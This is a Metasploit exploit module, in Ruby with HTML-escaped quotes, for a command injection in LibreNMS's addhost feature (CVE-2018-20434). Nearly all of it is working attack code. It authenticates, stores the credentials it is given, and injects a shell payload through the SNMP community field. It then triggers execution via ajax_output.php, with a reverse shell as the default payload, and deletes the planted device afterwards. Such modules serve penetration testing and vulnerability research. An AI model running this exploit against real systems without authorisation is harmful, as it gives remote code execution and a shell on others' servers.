# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;LibreNMS addhost Command Injection&#039;,
      &#039;Description&#039;    => %q(
         This module exploits a command injection vulnerability in the open source
         network management software known as LibreNMS. The community parameter used
         in a POST request to the addhost functionality is unsanitized. This parameter
         is later used as part of a shell command that gets passed to the popen function
         in capture.inc.php, which can result in execution of arbitrary code.

         This module requires authentication to LibreNMS first.
      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
      [
        &#039;mhaskar&#039;,       # Vulnerability discovery and PoC
        &#039;Shelby Pace&#039;    # Metasploit module
      ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2018-20434&#039; ],
          [ &#039;URL&#039;, &#039;https://shells.systems/librenms-v1-46-remote-code-execution-cve-2018-20434/&#039; ],
          [ &#039;URL&#039;, &#039;https://gist.github.com/mhaskar/516df57aafd8c6e3a1d70765075d372d&#039; ]
        ],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          [ &#039;Linux&#039;,
            {
              &#039;Platform&#039; => &#039;unix&#039;,
              &#039;DefaultOptions&#039;  =>  { &#039;Payload&#039; =>  &#039;cmd/unix/reverse&#039; }
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;2018-12-16&#039;,
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
    [
      OptString.new(&#039;TARGETURI&#039;, [ true, &#039;Base LibreNMS path&#039;, &#039;/&#039; ]),
      OptString.new(&#039;USERNAME&#039;, [ true, &#039;User name for LibreNMS&#039;, &#039;&#039; ]),
      OptString.new(&#039;PASSWORD&#039;, [ true, &#039;Password for LibreNMS&#039;, &#039;&#039; ])
    ])
  end

  def login
    login_uri = normalize_uri(target_uri.path, &#039;login&#039;)
    res = send_request_cgi(&#039;method&#039; =>  &#039;GET&#039;, &#039;uri&#039;  =>  login_uri)
    fail_with(Failure::NotFound, &#039;Failed to access the login page&#039;) unless res && res.code == 200

    cookies = res.get_cookies

    login_res = send_request_cgi(
      &#039;method&#039;    =>  &#039;POST&#039;,
      &#039;uri&#039;       =>  login_uri,
      &#039;cookie&#039;    =>  cookies,
      &#039;vars_post&#039; =>
      {
        &#039;username&#039;  =>  datastore[&#039;USERNAME&#039;],
        &#039;password&#039;  =>  datastore[&#039;PASSWORD&#039;]
      }
    )

    fail_with(Failure::NoAccess, &#039;Failed to submit credentials to login page&#039;) unless login_res && login_res.code == 302

    cookies = login_res.get_cookies
    res = send_request_cgi(&#039;method&#039; =>  &#039;GET&#039;, &#039;uri&#039;  =>  normalize_uri(target_uri.path), &#039;cookie&#039; =>  cookies)
    fail_with(Failure::NoAccess, &#039;Failed to log into LibreNMS&#039;) unless res && res.code == 200 && res.body.include?(&#039;Devices&#039;)

    print_status(&#039;Successfully logged into LibreNMS. Storing credentials...&#039;)
    store_valid_credential(user: datastore[&#039;USERNAME&#039;], private: datastore[&#039;PASSWORD&#039;])
    login_res.get_cookies
  end

  def add_device(cookies)
    add_uri = normalize_uri(target_uri.path, &#039;addhost&#039;)
    @hostname = Rex::Text.rand_text_alpha(6...12)
    comm_payload = "&#039;; #{payload.encoded}#&#039;"

    res = send_request_cgi(
      &#039;method&#039;    =>  &#039;POST&#039;,
      &#039;uri&#039;       =>  add_uri,
      &#039;cookie&#039;    =>  cookies,
      &#039;vars_post&#039;  =>
      {
        &#039;snmp&#039;            =>  &#039;on&#039;,
        &#039;force_add&#039;       =>  &#039;on&#039;,
        &#039;snmpver&#039;         =>  &#039;v2c&#039;,
        &#039;hostname&#039;        =>  @hostname,
        &#039;community&#039;       =>  comm_payload,
        &#039;authalgo&#039;        =>  &#039;MD5&#039;,
        &#039;cryptoalgo&#039;      =>  &#039;AES&#039;,
        &#039;transport&#039;       =>  &#039;udp&#039;,
        &#039;port_assoc_mode&#039; =>  &#039;ifIndex&#039;
      }
    )

    fail_with(Failure::NotFound, &#039;Failed to add device&#039;) unless res && res.body.include?(&#039;Device added&#039;)
    print_good("Successfully added device with hostname #{@hostname}")

    host_id = res.get_html_document.search(&#039;div[@class="alert alert-success"]/a[@href]&#039;).text
    fail_with(Failure::NotFound, "Couldn&#039;t retrieve the id for the device") if host_id.empty?
    host_id = host_id.match(/(\d+)/).nil? ? nil : host_id.match(/(\d+)/)

    fail_with(Failure::NotFound, &#039;Failed to retrieve a valid device id&#039;) if host_id.nil?

    host_id
  end

  def del_device(id, cookies)
    del_uri = normalize_uri(target_uri.path, &#039;delhost&#039;)
    res = send_request_cgi(
      &#039;method&#039;    =>  &#039;POST&#039;,
      &#039;uri&#039;       =>  del_uri,
      &#039;cookie&#039;    =>  cookies,
      &#039;vars_post&#039; =>
      {
        &#039;id&#039;      =>  id,
        &#039;confirm&#039; =>  1
      }
    )

    print_status(&#039;Unsure if device was deleted. No response received&#039;) unless res

    if res.body.include?("Removed device #{@hostname.downcase}")
      print_good("Successfully deleted device with hostname #{@hostname} and id ##{id}")
    else
      print_status(&#039;Failed to delete device. Manual deletion may be needed&#039;)
    end
  end

  def exploit
    exp_uri = normalize_uri(target_uri.path, &#039;ajax_output.php&#039;)
    cookies = login

    host_id = add_device(cookies)
    send_request_cgi(
      &#039;method&#039;    =>  &#039;GET&#039;,
      &#039;uri&#039;       =>  exp_uri,
      &#039;cookie&#039;    =>  cookies,
      &#039;vars_get&#039;  =>
      {
        &#039;id&#039;        =>  &#039;capture&#039;,
        &#039;format&#039;    =>  &#039;text&#039;,
        &#039;type&#039;      =>  &#039;snmpwalk&#039;,
        &#039;hostname&#039;  =>  @hostname
      }
    )

    del_device(host_id, cookies)
  end
end

